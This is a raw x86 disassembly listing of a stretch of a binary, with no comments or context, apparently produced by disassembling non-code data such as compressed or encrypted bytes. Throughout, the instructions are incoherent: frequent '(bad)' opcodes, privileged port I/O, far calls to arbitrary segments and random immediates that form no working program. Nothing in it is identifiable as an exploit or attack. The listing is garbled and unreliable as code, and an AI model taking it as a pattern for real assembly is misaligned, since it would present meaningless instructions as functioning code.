  41cd21:	jne    0x41cd54
  41cd23:	xchg   ebx,eax
  41cd24:	pop    edi
  41cd25:	push   eax
  41cd26:	rcl    BYTE PTR [eax+0x1080cdb3],1
  41cd2c:	jne    0x41ccd1
  41cd2e:	aam    0x6a
  41cd30:	dec    ebx
  41cd31:	and    al,ah
  41cd33:	pop    ebx
  41cd34:	jge    0x41cd18
  41cd36:	fidivr DWORD PTR [eax+0x50]
  41cd39:	aas    
  41cd3a:	jbe    0x41ccf3
  41cd3c:	(bad)
  41cd3f:	loopne 0x41cd77
  41cd41:	dec    edi
  41cd42:	mov    al,0x8f
  41cd44:	les    edx,FWORD PTR [edi-0x67]
  41cd47:	std    
  41cd48:	fwait
  41cd49:	retf   0x2d4d
  41cd4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd4d:	out    dx,al
  41cd4e:	pushf  
  41cd4f:	mov    ebp,0x812c0714
  41cd54:	jbe    0x41cda7
  41cd56:	repnz push ss
  41cd58:	cmp    eax,edi
  41cd5a:	rcl    DWORD PTR [ecx+0x3e80a0b4],0x59
  41cd61:	lds    edx,FWORD PTR [ebx-0x27c0e2d8]
  41cd67:	add    ah,al
  41cd69:	gs test al,0x8d
  41cd6c:	mov    esi,0x1cb0b8ce
  41cd71:	test   eax,0x56e1f388
  41cd76:	xlat   BYTE PTR ds:[ebx]
  41cd77:	lods   eax,DWORD PTR ds:[esi]
  41cd78:	inc    esp
  41cd79:	stos   DWORD PTR es:[edi],eax
  41cd7a:	js     0x41cd2d
  41cd7c:	add    DWORD PTR [ecx],ebx
  41cd7e:	or     ebp,DWORD PTR [esi]
  41cd80:	cmp    BYTE PTR [ecx-0x76],al
  41cd83:	loope  0x41cdff
  41cd85:	sbb    DWORD PTR [esi+eiz*8],esp
  41cd88:	loop   0x41cddf
  41cd8a:	sbb    ebp,DWORD PTR [ebx-0x6e]
  41cd8d:	movntps XMMWORD PTR ds:0xfc68c07,xmm7
  41cd94:	bound  edx,QWORD PTR [ecx]
  41cd96:	(bad)  
  41cd97:	int3   
  41cd98:	mov    ah,0xca
  41cd9a:	in     eax,0xa9
  41cd9c:	cmc    
  41cd9d:	stos   BYTE PTR es:[edi],al
  41cd9e:	push   es
  41cd9f:	mov    dh,0xe5
  41cda1:	xor    BYTE PTR [ebx],0xe1
  41cda4:	mov    ch,0x39
  41cda6:	ss test al,0xe2
  41cda9:	das    
  41cdaa:	push   0x45
  41cdac:	sahf   
  41cdad:	jb     0x41cdab
  41cdaf:	stos   DWORD PTR es:[edi],eax
  41cdb0:	mov    esi,0xf6c1637b
  41cdb5:	test   BYTE PTR [edi-0x7c],dl
  41cdb8:	es stos DWORD PTR es:[edi],eax
  41cdba:	push   eax
  41cdbb:	add    al,0x81
  41cdbd:	pop    esi
  41cdbe:	test   eax,0x83d9bdaf
  41cdc3:	sub    ch,BYTE PTR [ebp+0x737b7560]
  41cdc9:	sar    BYTE PTR [edi+0xb],1
  41cdcc:	and    DWORD PTR [ecx],esi
  41cdce:	push   esi
  41cdcf:	mov    dl,0x8f
  41cdd1:	fld    DWORD PTR [ebx-0x59d471e6]
  41cdd7:	sbb    bh,BYTE PTR [ecx]
  41cdd9:	pop    esp
  41cdda:	(bad)  
  41cddb:	sbb    eax,0x7d15ec33
  41cde0:	leave  
  41cde1:	arpl   WORD PTR [edi],si
  41cde3:	push   0xffffffef
  41cde5:	les    ebx,FWORD PTR [edx+ebx*8]
  41cde8:	stos   BYTE PTR es:[edi],al
  41cde9:	inc    eax
  41cdea:	push   edx
  41cdeb:	xchg   DWORD PTR [edi+edx*8-0x46],edi
  41cdef:	gs and al,0xac
  41cdf2:	fidivr DWORD PTR [edx]
  41cdf4:	push   ebx
  41cdf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdf6:	inc    ecx
  41cdf7:	or     eax,0xc6230465
  41cdfc:	lahf   
  41cdfd:	jae    0x41ce43
  41cdff:	pop    ecx
  41ce00:	cld    
  41ce01:	xchg   BYTE PTR [ecx+edx*2+0x73],ch
  41ce05:	in     al,dx
  41ce06:	sbb    bl,ah
  41ce08:	lock add DWORD PTR [eax-0x9fff96f],0x19
  41ce10:	cmc    
  41ce11:	mov    eax,ds:0x9ecbc0cf
  41ce16:	inc    ecx
  41ce17:	xchg   edi,eax
  41ce18:	xchg   ebp,eax
  41ce19:	ds cmc 
  41ce1b:	sti    
  41ce1c:	xor    eax,0x7ef8e7d1
  41ce21:	jbe    0x41ce65
  41ce23:	inc    ebx
  41ce24:	jae    0x41ce39
  41ce26:	ret    
  41ce27:	ror    esi,1
  41ce29:	cmp    BYTE PTR [edi+0x5e],dh
  41ce2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce2d:	pop    edi
  41ce2e:	inc    ecx
  41ce2f:	xchg   ebp,eax
  41ce30:	mov    esp,0x4fd347ef
  41ce35:	jae    0x41ce12
  41ce37:	mov    dl,BYTE PTR [ebp-0x6d6d9aad]
  41ce3d:	dec    eax
  41ce3e:	and    al,0xd8
  41ce40:	xchg   DWORD PTR [esi+0x4f],ebp
  41ce43:	sbb    BYTE PTR [ebx+0x21b3cf11],ah
  41ce49:	sub    DWORD PTR [ebp+0x46],ebx
  41ce4c:	dec    edx
  41ce4d:	cs call 0xcff8:0xde19cf1a
  41ce55:	loope  0x41cea2
  41ce57:	mov    es,WORD PTR [ebx+0x2ef9de4d]
  41ce5d:	xor    ch,BYTE PTR [ecx+0x6fa53003]
  41ce63:	popa   
  41ce64:	xlat   BYTE PTR ds:[ebx]
  41ce65:	ja     0x41ceb8
  41ce67:	cld    
  41ce68:	mov    eax,0x907d2891
  41ce6d:	mov    ah,0xb3
  41ce6f:	and    BYTE PTR [ebx-0x66198d8d],0x38
  41ce76:	pushf  
  41ce77:	imul   esp,DWORD PTR [ebp-0x374ad854],0x59
  41ce7e:	xor    DWORD PTR [ecx+0x38],esi
  41ce81:	sbb    al,0x8b
  41ce83:	pop    ecx
  41ce84:	dec    ebx
  41ce85:	pop    esp
  41ce86:	pop    ebp
  41ce87:	push   0x14c9a0a7
  41ce8c:	ret    0x31b4
  41ce8f:	cmp    eax,0xc5bd4b08
  41ce94:	loop   0x41cebb
  41ce96:	mov    al,0x9b
  41ce98:	mov    al,ds:0x76063a55
  41ce9d:	mov    fs,WORD PTR [esi+0x3cf51db4]
  41cea3:	not    BYTE PTR [edi+0x33]
  41cea6:	push   edi
  41cea7:	sahf   
  41cea8:	es ret 0x47df
  41ceac:	add    esi,DWORD PTR [ecx]
  41ceae:	sub    DWORD PTR [eax],edx
  41ceb0:	or     esi,DWORD PTR [bp+di]
  41ceb3:	sub    al,0xb8
  41ceb5:	dec    ebx
  41ceb6:	scas   eax,DWORD PTR es:[edi]
  41ceb7:	push   esi
  41ceb8:	and    DWORD PTR [ebx-0x41],ecx
  41cebb:	sbb    DWORD PTR [ecx+0x281e3f44],edi
  41cec1:	sub    ah,BYTE PTR [eax+0x10d89b01]
  41cec7:	or     bl,cl
  41cec9:	rol    BYTE PTR [eax+0x5bb3a711],1
  41cecf:	aam    0xb9
  41ced1:	loopne 0x41cf28
  41ced3:	jle    0x41cec1
  41ced5:	lock or ebx,edx
  41ced8:	push   esp
  41ced9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ceda:	pop    edx
  41cedb:	jb     0x41ce9b
  41cedd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cede:	test   BYTE PTR [ebp+ebx*1+0x58],dl
  41cee2:	add    BYTE PTR [ecx-0x683857a3],bl
  41cee8:	ror    BYTE PTR [ebp-0x5810bac5],0x9
  41ceef:	and    esp,ecx
  41cef1:	arpl   WORD PTR [eax-0x1d],ax
  41cef4:	pop    ds
  41cef5:	ja     0x41cee2
  41cef7:	lods   eax,DWORD PTR ds:[esi]
  41cef8:	add    dl,BYTE PTR [ebp-0x4a]
  41cefb:	push   eax
  41cefc:	add    al,0xe5
  41cefe:	icebp  
  41ceff:	fild   DWORD PTR [eax+edi*8+0x2f201b29]
  41cf06:	(bad)  
  41cf07:	jecxz  0x41cf3c
  41cf09:	fs jmp 0x9bef:0x10d49e43
  41cf11:	push   edx
  41cf12:	mov    ch,0x37
  41cf14:	stos   BYTE PTR es:[edi],al
  41cf15:	aaa    
  41cf16:	or     DWORD PTR [ebp+0x25e1dad2],ecx
  41cf1c:	xor    cl,bl
  41cf1e:	in     al,dx
  41cf1f:	pop    esi
  41cf20:	stos   DWORD PTR es:[edi],eax
  41cf21:	xchg   edx,eax
  41cf22:	add    bl,BYTE PTR [edx+0x7184311c]
  41cf28:	dec    esi
  41cf29:	mov    es,WORD PTR [ebx-0x5]
  41cf2c:	pop    ebx
  41cf2d:	sbb    eax,0x511f297e
  41cf32:	sbb    cl,BYTE PTR [ecx]
  41cf34:	inc    ebx
  41cf35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf36:	pusha  
  41cf37:	and    cl,ch
  41cf39:	stos   DWORD PTR es:[edi],eax
  41cf3a:	or     bl,dh
  41cf3c:	push   edi
  41cf3d:	pop    edi
  41cf3e:	ds ds ret 0x3daf
  41cf43:	pop    edi
  41cf44:	cmp    BYTE PTR [edi+ebx*1+0x7dcf4ce0],ah
  41cf4b:	adc    al,0xa0
  41cf4d:	popa   
  41cf4e:	outs   dx,DWORD PTR ds:[esi]
  41cf4f:	(bad)  
  41cf50:	xchg   ebp,eax
  41cf51:	inc    edx
  41cf52:	fstp   TBYTE PTR [eax+edi*4+0x78]
  41cf56:	fwait
  41cf57:	sub    esi,DWORD PTR [edx-0x424bd85e]
  41cf5d:	ret    
  41cf5e:	rcl    ebp,0x77
  41cf61:	mov    ch,bh
  41cf63:	mov    eax,0x165c746a
  41cf68:	and    DWORD PTR [edi],ecx
  41cf6a:	repz cdq 
  41cf6c:	test   BYTE PTR es:[ebp-0x76],0x76
  41cf71:	and    al,0x95
  41cf73:	ins    BYTE PTR es:[edi],dx
  41cf74:	sub    ah,BYTE PTR [ebx]
  41cf76:	ins    BYTE PTR es:[edi],dx
  41cf77:	xlat   BYTE PTR ds:[ebx]
  41cf78:	fisub  WORD PTR [ebp-0x33]
  41cf7b:	push   0x61bfe11b
  41cf80:	cdq    
  41cf81:	cli    
  41cf82:	cmp    al,0xe0
  41cf84:	int3   
  41cf85:	mov    ch,0x6a
  41cf87:	repnz xor eax,0xa0d20325
  41cf8d:	sar    ah,0x72
  41cf90:	push   edx
  41cf91:	int3   
  41cf92:	and    eax,0xc1844649
  41cf97:	pop    ss
  41cf98:	jae    0x41cf66
  41cf9a:	lods   al,BYTE PTR ds:[esi]
  41cf9b:	and    BYTE PTR [ebx+ecx*2],bl
  41cf9e:	das    
  41cf9f:	lds    edi,FWORD PTR [edx]
  41cfa1:	xchg   ecx,eax
  41cfa2:	pop    edx
  41cfa3:	fs push ds
  41cfa5:	adc    DWORD PTR [ecx-0x45],0xffffffe3
  41cfa9:	test   eax,0xaed7f1e0
  41cfae:	hlt    
  41cfaf:	les    edi,FWORD PTR [eax+0x2f]
  41cfb2:	xor    eax,0xbe15df79
  41cfb7:	or     edi,DWORD PTR [bx-0x6a3a]
  41cfbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfbd:	or     esp,DWORD PTR [edi-0x1c164e33]
  41cfc3:	xor    al,0xf8
  41cfc5:	push   ebp
  41cfc6:	outs   dx,BYTE PTR ds:[esi]
  41cfc7:	das    
  41cfc8:	mov    ds:0xac0120b7,al
  41cfcd:	dec    eax
  41cfce:	mov    edi,0x33164930
  41cfd3:	call   FWORD PTR [edx+0x1a]
  41cfd6:	pop    esp
  41cfd7:	imul   ecx,esi,0x4925bae9
  41cfdd:	mov    dh,0xe7
  41cfdf:	pusha  
  41cfe0:	push   ebx
  41cfe1:	cld    
  41cfe2:	xor    DWORD PTR [ecx],esi
  41cfe4:	outs   dx,BYTE PTR ds:[esi]
  41cfe5:	sub    al,0x73
  41cfe7:	test   eax,0x3f85f91b
  41cfec:	js     0x41d02c
  41cfee:	push   eax
  41cfef:	(bad)  
  41cff0:	outs   dx,DWORD PTR ds:[esi]
  41cff1:	xor    al,0x6e
  41cff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cff4:	ficom  WORD PTR [esi-0x6a]
  41cff7:	aaa    
  41cff8:	ss aam 0xee
  41cffb:	int    0xdf
  41cffd:	int3   
  41cffe:	les    ebx,FWORD PTR [eax-0x35]
  41d001:	cwde   
  41d002:	adc    BYTE PTR [eax-0x3a],0x63
  41d006:	xchg   edx,eax
  41d007:	div    bh
  41d009:	sti    
  41d00a:	jns    0x41d041
  41d00c:	inc    eax
  41d00d:	out    dx,eax
  41d00e:	mov    eax,ds:0xde7c04b0
  41d013:	cmp    al,0x26
  41d015:	xor    BYTE PTR [eiz*4-0x69582ce4],bh
  41d01c:	and    DWORD PTR [ebx-0x1e018e58],ebp
  41d022:	(bad)  
  41d023:	xchg   esi,eax
  41d024:	fisub  DWORD PTR [edx-0x3d]
  41d027:	xchg   ebp,eax
  41d028:	inc    edi
  41d029:	dec    ecx
  41d02a:	bound  ebx,QWORD PTR [edx]
  41d02c:	dec    ebx
  41d02d:	sbb    al,al
  41d02f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d030:	jb     0x41cffb
  41d032:	icebp  
  41d033:	sti    
  41d034:	fabs   
  41d036:	int3   
  41d037:	dec    ebp
  41d038:	shl    cl,0x98
  41d03b:	mov    ch,0x46
  41d03d:	mov    esp,0x6c986ca8
  41d042:	dec    ebx
  41d043:	push   ss
  41d044:	cwde   
  41d045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d046:	in     al,0x29
  41d048:	lods   eax,DWORD PTR gs:[esi]
  41d04a:	push   edi
  41d04b:	cli    
  41d04c:	jmp    0x41d083
  41d04e:	iret   
  41d04f:	idiv   BYTE PTR [edi-0x2fc83152]
  41d055:	clc    
  41d056:	fsub   st,st(3)
  41d058:	mov    ah,0x5e
  41d05a:	stc    
  41d05b:	mov    ds:0xd46ee2ff,al
  41d060:	call   FWORD PTR [edx+0x36c3aba4]
  41d066:	mov    ah,0x68
  41d068:	jmp    0x67a7:0xe210940a
  41d06f:	imul   edi,esi,0x13
  41d072:	call   0xaebf:0xc50260bf
  41d079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d07a:	and    BYTE PTR [ebp-0x5c81755b],dl
  41d080:	pop    edx
  41d081:	into   
  41d082:	xlat   BYTE PTR ds:[ebx]
  41d083:	and    ecx,DWORD PTR ds:0x96742597
  41d089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d08a:	imul   esp,DWORD PTR [edi+0x6d669bf3],0x60b9a277
  41d094:	lock dec edi
  41d096:	inc    BYTE PTR [ebx-0x17]
  41d099:	test   DWORD PTR [edx],esp
  41d09b:	cs popf 
  41d09d:	scas   eax,DWORD PTR es:[edi]
  41d09e:	out    dx,eax
  41d09f:	xchg   esi,eax
  41d0a0:	mov    edx,0xddf9921
  41d0a5:	loope  0x41d0ea
  41d0a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0a8:	pushf  
  41d0a9:	sahf   
  41d0aa:	cwde   
  41d0ab:	mov    bl,0xcf
  41d0ad:	iret   
  41d0ae:	js     0x41d0f9
  41d0b0:	inc    edx
  41d0b1:	data16 fiadd WORD PTR [ebx]
  41d0b4:	and    ebx,edx
  41d0b6:	adc    dl,BYTE PTR [edi]
  41d0b8:	loop   0x41d0bb
  41d0ba:	in     eax,0xec
  41d0bc:	dec    ecx
  41d0bd:	(bad)  
  41d0be:	pop    edi
  41d0bf:	push   ebp
  41d0c0:	ja     0x41d13b
  41d0c2:	cs jae 0x41d123
  41d0c5:	(bad)  
  41d0c6:	mov    ecx,0xcb319cbb
  41d0cb:	sub    BYTE PTR [eax+0x75],ah
  41d0ce:	js     0x41d142
  41d0d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0d1:	xlat   BYTE PTR ds:[ebx]
  41d0d2:	mov    esp,0x1745546b
  41d0d7:	xlat   BYTE PTR ds:[ebx]
  41d0d8:	mov    ch,0xbb
  41d0da:	int    0xe6
  41d0dc:	inc    ecx
  41d0dd:	xchg   esi,eax
  41d0de:	(bad)  
  41d0e0:	push   esi
  41d0e1:	jae    0x41d15e
  41d0e3:	lods   eax,DWORD PTR ds:[esi]
  41d0e4:	push   es
  41d0e5:	jle    0x41d0c3
  41d0e7:	out    dx,eax
  41d0e8:	pop    ecx
  41d0e9:	dec    ebp
  41d0ea:	hlt    
  41d0eb:	iret   
  41d0ec:	stos   DWORD PTR es:[edi],eax
  41d0ed:	pop    ecx
  41d0ee:	popa   
  41d0ef:	int    0xdf
  41d0f1:	dec    eax
  41d0f2:	mov    eax,0xc201ede2
  41d0f7:	cmp    edi,esi
  41d0f9:	add    bl,ch
  41d0fb:	xchg   edi,eax
  41d0fc:	mov    ds:0x17236313,eax
  41d101:	ins    DWORD PTR es:[edi],dx
  41d102:	cmp    eax,DWORD PTR [eax+edi*4+0x74]
  41d106:	mov    es:0x82cd729c,eax
  41d10c:	add    DWORD PTR [ebx+0x49],edi
  41d10f:	or     edi,ebp
  41d111:	stos   DWORD PTR es:[edi],eax
  41d112:	adc    esi,DWORD PTR [edx+0x1f4a92b4]
  41d118:	nop
  41d119:	retf   
  41d11a:	ins    DWORD PTR es:[edi],dx
  41d11b:	stos   DWORD PTR es:[edi],eax
  41d11c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d11d:	repz sbb ch,ch
  41d120:	push   esi
  41d121:	add    ebp,esp
  41d123:	cmp    ah,ch
  41d125:	inc    ebx
  41d126:	lods   eax,DWORD PTR ds:[esi]
  41d127:	and    eax,esp
  41d129:	in     eax,dx
  41d12a:	test   BYTE PTR ds:0xf12e77f3,al
  41d130:	fstp   TBYTE PTR [eax+0x21]
  41d133:	dec    edx
  41d134:	pop    ecx
  41d135:	push   eax
  41d136:	xchg   esp,eax
  41d137:	lock pop ecx
  41d139:	test   DWORD PTR [esi],ecx
  41d13b:	add    DWORD PTR [ebx-0x7088dd82],ebx
  41d141:	cdq    
  41d142:	or     al,0x41
  41d144:	repz mov ds:0xdd78c2be,al
  41d14a:	and    ah,bl
  41d14c:	fcom   DWORD PTR [edx+eiz*8+0x73244c2f]
  41d153:	and    DWORD PTR [ebx+0x68],edi
  41d156:	dec    esp
  41d157:	sub    BYTE PTR [edx],0x3
  41d15a:	push   es
  41d15b:	out    0x72,al
  41d15d:	addr16 (bad) 
  41d15f:	adc    ecx,DWORD PTR [esp+ecx*2+0x6]
  41d163:	cmp    edi,DWORD PTR [eax]
  41d165:	in     eax,0x68
  41d167:	adc    al,0xf4
  41d169:	neg    DWORD PTR [edi]
  41d16b:	aaa    
  41d16c:	les    edx,FWORD PTR [ebp+ebp*4+0x51]
  41d170:	stos   DWORD PTR es:[edi],eax
  41d171:	xlat   BYTE PTR ds:[ebx]
  41d172:	inc    ebp
  41d173:	int3   
  41d174:	adc    eax,0x666a53a1
  41d179:	mov    ds:0x1ef4d816,al
  41d17e:	inc    eax
  41d17f:	in     eax,0xdc
  41d181:	dec    BYTE PTR [eax]
  41d183:	(bad)
  41d187:	sbb    eax,0xa6aefaff
  41d18c:	mov    dh,0xda
  41d18e:	dec    edx
  41d18f:	or     DWORD PTR [ebx-0x67],edx
  41d192:	fwait
  41d193:	enter  0x8a4b,0xda
  41d197:	add    al,0xc6
  41d199:	mov    eax,ds:0x15caaa90
  41d19e:	dec    edx
  41d19f:	xor    al,0x1d
  41d1a1:	push   eax
  41d1a2:	(bad)  
  41d1a3:	aad    0x33
  41d1a5:	dec    BYTE PTR [edx]
  41d1a7:	xor    DWORD PTR [eax],0x5a
  41d1aa:	dec    eax
  41d1ab:	dec    ecx
  41d1ac:	adc    al,0x3e
  41d1ae:	push   esp
  41d1af:	(bad)  
  41d1b0:	shl    DWORD PTR [edx],cl
  41d1b2:	imul   ebx,DWORD PTR [esi],0x2c84155c
  41d1b8:	inc    ebx
  41d1b9:	lock jbe 0x41d1d8
  41d1bc:	xchg   ecx,eax
  41d1bd:	scas   al,BYTE PTR es:[edi]
  41d1be:	ss sbb al,0xf2
  41d1c1:	mov    esp,0x1a37de79
  41d1c6:	and    al,0x45
  41d1c8:	xor    ecx,DWORD PTR [ecx]
  41d1ca:	sub    ecx,DWORD PTR [eax-0x14]
  41d1cd:	mov    dl,0x31
  41d1cf:	push   es
  41d1d0:	outs   dx,DWORD PTR ds:[esi]
  41d1d2:	jo     0x41d214
  41d1d4:	xor    eax,0x4797c3f4
  41d1d9:	adc    DWORD PTR [ecx-0x539d642c],eax
  41d1df:	mov    esp,0x780649e8
  41d1e4:	stos   BYTE PTR es:[edi],al
  41d1e5:	retf   
  41d1e6:	stos   BYTE PTR es:[edi],al
  41d1e7:	mov    ah,BYTE PTR [esi]
  41d1e9:	ja     0x41d190
  41d1eb:	mov    WORD PTR [ebx+0x4c80bb73],ds
  41d1f1:	jno    0x41d1b3
  41d1f3:	fs push ecx
  41d1f5:	aaa    
  41d1f6:	or     BYTE PTR [edx-0x541929ee],cl
  41d1fc:	add    al,0xba
  41d1fe:	mov    esi,DWORD PTR fs:[esi+0x1e]
  41d202:	inc    ebp
  41d203:	(bad)  
  41d204:	cmp    eax,0x98ff6a83
  41d209:	xor    DWORD PTR [ebx+esi*2-0x92775f],esi
  41d210:	dec    ecx
  41d211:	pusha  
  41d212:	jle    0x41d1ec
  41d214:	stc    
  41d215:	and    BYTE PTR [edx],ch
  41d217:	adc    ah,bl
  41d219:	sub    ebx,ebx
  41d21b:	loope  0x41d1cb
  41d21d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d21e:	cmp    eax,DWORD PTR [edx+0x59]
  41d221:	pop    esi
  41d222:	fs in  eax,dx
  41d224:	xchg   edx,eax
  41d225:	mov    ds:0xdeeafcb8,eax
  41d22a:	adc    esp,DWORD PTR [ebx]
  41d22c:	jl     0x41d259
  41d22e:	mov    ds:0x2fb9bf8c,al
  41d233:	add    BYTE PTR [ecx-0x21],bl
  41d236:	jbe    0x41d1e9
  41d238:	and    eax,0xe815a272
  41d23d:	aas    
  41d23e:	adc    ch,dh
  41d240:	pop    esi
  41d241:	out    0x84,eax
  41d243:	sub    BYTE PTR [esi],cl
  41d245:	ret    0xb512
  41d248:	es sbb al,ch
  41d24b:	pop    ds
  41d24c:	cli    
  41d24d:	loop   0x41d2bf
  41d24f:	test   eax,0x583e1c52
  41d254:	pop    ebx
  41d255:	clc    
  41d256:	mov    esi,edi
  41d258:	lahf   
  41d259:	mov    esp,0x7109b8b4
  41d25e:	mov    dl,0xbc
  41d260:	xchg   ebp,eax
  41d261:	lahf   
  41d262:	dec    esi
  41d263:	jp     0x41d294
  41d265:	add    eax,0xfe79d0e0
  41d26a:	int    0x85
  41d26c:	fisubr WORD PTR [bx+0x143a]
  41d271:	sbb    BYTE PTR [edi-0x16],bh
  41d274:	or     ah,0x67
  41d277:	rol    edx,cl
  41d279:	scas   eax,DWORD PTR es:[edi]
  41d27a:	ja     0x41d203
  41d27c:	add    ah,BYTE PTR [edx+ecx*2+0xa]
  41d280:	imul   ebx,ebx,0x7c
  41d283:	pop    esi
  41d284:	dec    esp
  41d285:	push   ds
  41d286:	push   esi
  41d287:	jb     0x41d2f6
  41d289:	retf   0xf224
  41d28c:	mov    dl,0xd9
  41d28e:	push   edi
  41d28f:	inc    ecx
  41d290:	xor    eax,0x419b8892
  41d295:	mov    dl,0x3
  41d297:	inc    edx
  41d298:	cmp    al,0x19
  41d29a:	sbb    al,0x38
  41d29c:	cmp    al,0x3f
  41d29e:	jnp    0x41d30d
  41d2a0:	daa    
  41d2a1:	fistp  WORD PTR [ebx+ecx*1]
  41d2a4:	call   0xeb82218e
  41d2a9:	mov    ah,0xd5
  41d2ab:	mov    al,ds:0x8d9faa1c
  41d2b0:	aas    
  41d2b1:	adc    ebp,DWORD PTR [esi+ebx*1]
  41d2b4:	xor    ebx,DWORD PTR [ecx+0x262e5905]
  41d2ba:	mov    dh,0x93
  41d2bc:	xor    BYTE PTR [eax+0x5a],bl
  41d2bf:	mov    bh,0x49
  41d2c1:	xchg   esp,eax
  41d2c2:	mov    al,0x9d
  41d2c4:	in     al,0x42
  41d2c6:	adc    al,BYTE PTR [ecx]
  41d2c8:	adc    al,BYTE PTR [ebx+0x6f7fa739]
  41d2ce:	mov    fs,WORD PTR [edi+eax*2+0x1ca68738]
  41d2d5:	in     al,dx
  41d2d6:	ins    BYTE PTR es:[edi],dx
  41d2d7:	fwait
  41d2d8:	out    dx,al
  41d2d9:	mov    dl,0xbf
  41d2db:	xor    eax,DWORD PTR [esi+0xfdd8935]
  41d2e1:	xchg   esp,eax
  41d2e2:	inc    ebx
  41d2e3:	aad    0xa7
  41d2e5:	adc    bl,dh
  41d2e7:	sub    esp,0x86bfa0f4
  41d2ed:	add    ah,BYTE PTR [edi+0xe7608ab]
  41d2f3:	and    DWORD PTR [ebp+0x73],0xffffff96
  41d2f7:	sub    DWORD PTR [eax],0xffffffbc
  41d2fa:	sub    eax,0x514f93a0
  41d2ff:	fs fcmovne st,st(5)
  41d302:	addr16 jns 0x41d359
  41d305:	mov    DWORD PTR [ebp+0x69],ecx
  41d308:	test   eax,0xb9c04d8
  41d30d:	pusha  
  41d30e:	addr16 pop es
  41d310:	mov    cl,0x33
  41d312:	fst    DWORD PTR [ecx+ebp*8]
  41d315:	sti    
  41d316:	aam    0x94
  41d318:	pop    eax
  41d319:	idiv   BYTE PTR [ebx]
  41d31b:	cmp    DWORD PTR [edx-0x65],ecx
  41d31e:	out    dx,al
  41d31f:	cmp    eax,0xf83acf4e
  41d324:	sbb    al,0xae
  41d326:	rep ins DWORD PTR es:[edi],dx
  41d328:	mov    ebx,0xd81edd49
  41d32d:	or     DWORD PTR [eax],ebx
  41d32f:	fldcw  WORD PTR [esi+0x4]
  41d332:	inc    edi
  41d333:	push   ebx
  41d334:	je     0x41d3a3
  41d336:	push   ds
  41d337:	sbb    al,0x68
  41d339:	out    0x5a,al
  41d33b:	jbe    0x41d37a
  41d33d:	loopne 0x41d396
  41d33f:	xor    ch,BYTE PTR [eax]
  41d341:	inc    ebp
  41d342:	fisub  WORD PTR [ecx+0x4274c821]
  41d348:	call   0x873b:0x24f1711c
  41d34f:	pushfw 
  41d351:	aaa    
  41d352:	js     0x41d3a2
  41d354:	shl    DWORD PTR gs:[esi+0x5b1d9c4d],0xa8
  41d35c:	sub    BYTE PTR [esi+0x7b],ah
  41d35f:	or     esp,esp
  41d361:	shl    BYTE PTR [ebx],0x61
  41d364:	fnstcw WORD PTR [edi+ecx*8]
  41d367:	fcmovne st,st(1)
  41d369:	xor    DWORD PTR [edx+0x38],ebp
  41d36c:	aad    0x52
  41d36e:	(bad)  
  41d36f:	mov    ebp,0x187e66e6
  41d374:	lods   eax,DWORD PTR ds:[esi]
  41d375:	nop
  41d376:	push   0x73f44ec4
  41d37b:	lods   eax,DWORD PTR ds:[esi]
  41d37c:	and    al,0x22
  41d37e:	add    BYTE PTR [eax+0x5719a8b0],ch
  41d384:	push   ss
  41d385:	pop    esi
  41d386:	mov    bh,BYTE PTR [esp+eiz*8+0x149e14bb]
  41d38d:	xor    eax,0x824a1e9c
  41d392:	mov    bl,0x27
  41d394:	xor    al,BYTE PTR [esi-0x26]
  41d397:	scas   al,BYTE PTR es:[edi]
  41d398:	(bad)  
  41d399:	popf   
  41d39a:	xchg   esp,eax
  41d39b:	inc    eax
  41d39c:	jno    0x41d3c4
  41d39e:	xor    al,0xe5
  41d3a0:	pop    edi
  41d3a1:	sub    DWORD PTR [esi-0x39],edx
  41d3a4:	mov    cl,0x90
  41d3a6:	(bad)  
  41d3a7:	fnstcw WORD PTR [eax+ebx*1+0x41]
  41d3ab:	pop    ecx
  41d3ac:	ret    0x24f2
  41d3af:	add    al,0xff
  41d3b1:	aas    
  41d3b2:	and    DWORD PTR [ebx+0x14],edi
  41d3b5:	leave  
  41d3b6:	jbe    0x41d41d
  41d3b8:	jle    0x41d3d4
  41d3ba:	sbb    BYTE PTR [ebp-0x38f192b0],0x33
  41d3c1:	ins    BYTE PTR es:[edi],dx
  41d3c2:	mov    cl,0xe1
  41d3c4:	fcmovbe st,st(5)
  41d3c6:	xchg   ecx,eax
  41d3c7:	push   ecx
  41d3c8:	imul   ebp,esp,0xffffff92
  41d3cb:	mov    DWORD PTR [edx+ebp*8+0x26],esp
  41d3cf:	cwde   
  41d3d0:	fild   DWORD PTR [edx]
  41d3d2:	push   es
  41d3d3:	outs   dx,BYTE PTR ds:[esi]
  41d3d4:	stos   BYTE PTR es:[edi],al
  41d3d5:	xor    ecx,DWORD PTR [esi-0x36a41b56]
  41d3db:	imul   esi,DWORD PTR [edi+0x27],0x4a
  41d3df:	pop    ebx
  41d3e0:	in     eax,0x3e
  41d3e2:	scas   al,BYTE PTR es:[edi]
  41d3e3:	jb     0x41d402
  41d3e5:	int3   
  41d3e6:	push   ecx
  41d3e7:	inc    esp
  41d3e8:	fistp  QWORD PTR ds:0x6183a027
  41d3ee:	push   esp
  41d3ef:	retf   0x5c7b
  41d3f2:	inc    ebp
  41d3f3:	sahf   
  41d3f4:	cmp    esi,DWORD PTR [esi]
  41d3f6:	push   ebp
  41d3f7:	xchg   ecx,eax
  41d3f8:	xor    ah,dl
  41d3fa:	fadd   QWORD PTR [edx-0x29]
  41d3fd:	xchg   ebp,eax
  41d3fe:	dec    edx
  41d3ff:	and    al,0xcf
  41d401:	dec    ebp
  41d402:	inc    ebp
  41d403:	jle    0x41d38e
  41d405:	jnp    0x41d41d
